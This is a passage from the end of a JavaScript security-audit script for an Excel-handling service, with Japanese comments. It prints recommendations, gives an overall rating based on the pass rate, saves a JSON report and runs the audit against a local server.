      console.log('💡 推奨事項:');
      this.auditResults.recommendations.forEach((rec, index) => {
        console.log(`   ${index + 1}. ${rec}\n`);
      });
    }

    // 総合評価
    let overallRating;
    if (passRate >= 90 && this.auditResults.criticalIssues.length === 0) {
      overallRating = '🟢 優秀';
    } else if (passRate >= 70 && this.auditResults.criticalIssues.length <= 1) {
      overallRating = '🟡 良好';
    } else if (passRate >= 50) {
      overallRating = '🟠 改善が必要';
    } else {
      overallRating = '🔴 重大な問題あり';
    }

    console.log(`\n🎯 総合評価: ${overallRating}`);
    
    // JSONレポート保存
    const reportData = {
      timestamp: new Date().toISOString(),
      summary: {
        totalTests: this.auditResults.totalTests,
        passedTests: this.auditResults.passedTests,
        failedTests: this.auditResults.failedTests,
        passRate: parseFloat(passRate),
        overallRating
      },
      criticalIssues: this.auditResults.criticalIssues,
      warnings: this.auditResults.warnings,
      recommendations: this.auditResults.recommendations
    };

    fs.writeFileSync(
      path.join(__dirname, '../../reports/excel-security-audit.json'),
      JSON.stringify(reportData, null, 2)
    );

    console.log('\n📄 詳細レポートが保存されました: reports/excel-security-audit.json');
  }
}

// メイン実行
async function main() {
  const auditor = new ExcelSecurityAuditor('http://localhost:3001');
  
  // 認証トークンが必要な場合は設定
  // auditor.authToken = 'your-jwt-token-here';
  
  await auditor.runFullSecurityAudit();
}

// スクリプトが直接実行された場合にmain関数を呼び出し
if (require.main === module) {
  main().catch(console.error);
}

module.exports = ExcelSecurityAuditor;